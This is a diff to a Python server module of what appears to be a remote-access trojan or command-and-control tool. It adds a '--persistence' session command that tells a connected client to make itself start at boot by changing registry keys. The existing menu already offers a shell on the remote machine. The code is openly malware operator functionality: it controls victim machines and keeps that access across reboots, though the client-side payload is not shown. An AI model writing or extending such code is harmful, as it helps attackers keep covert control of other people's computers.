@@ -10,10 +10,11 @@ from colorama import Fore,Style
 
 from .other import recvall
 from .other import printColor
+from .other import recvsafe
 from .management import CheckConn
 from .handler import Handler
 from .sql import Sql
-from .other import NB_SESSION , NB_SOCKET , NB_IP , NB_PORT , NB_ALIVE , NB_ADMIN , NB_PATH , NB_USERNAME , NB_TOKEN
+from .other import NB_SESSION , NB_SOCKET , NB_IP , NB_PORT , NB_ALIVE , NB_ADMIN , NB_PATH , NB_USERNAME , NB_TOKEN, SPLIT
 
 class Session:
     #This class is called when the target is selected.
@@ -26,13 +27,13 @@ class Session:
        
     def help(self):
         printColor("help","""
-
 -h or --help : Displays all session mode commands.
 
 -s or --shell : Start a shell on the remote machine.
 
 -b or --back : Back to menu.
 
+-p or --persistence : Makes the client persistent at startup by changing the registry keys.
 """) 
     def spawnShell(self):
         #Ouvre un shell sur la machine distante.
@@ -57,6 +58,22 @@ class Session:
             else:
                 pass
 
+    def lonelyPersistence(self):
+        #if Handler.dict_conn[self.session_nb][NB_ALIVE]:  #test is life
+        mod_persi = "MOD_LONELY_PERSISTENCE:default"
+        if(CheckConn().safeSend(self.session_nb, self.socket, mod_persi.encode())): #send mod persi
+            printColor("information","[+] the persistence mod was sent.\n")
+            
+            reponse = recvsafe(self.socket,4096).decode("utf-8","replace")
+
+            if(reponse == "\r\n"):#Mod persi ok  
+                printColor("successfully","[+] the persistence mod is well executed with success..\n")
+            else:
+                printColor("error","[-] the persistence mod could not be executed on the client.")
+
+        else:
+            printColor("information","[+] the persistence mod was not sent.\n")
+
 
     def printInformation(self):
         pass
@@ -77,6 +94,8 @@ class Session:
                 elif terminal[i] == "-b" or terminal[i] == "--back":
                     printColor("information","[-] Session stop.\n")
                     checker = False
+                elif terminal[i] == "-p" or terminal[i] == "--persistence":
+                    self.lonelyPersistence()
                 else:
                     pass
             
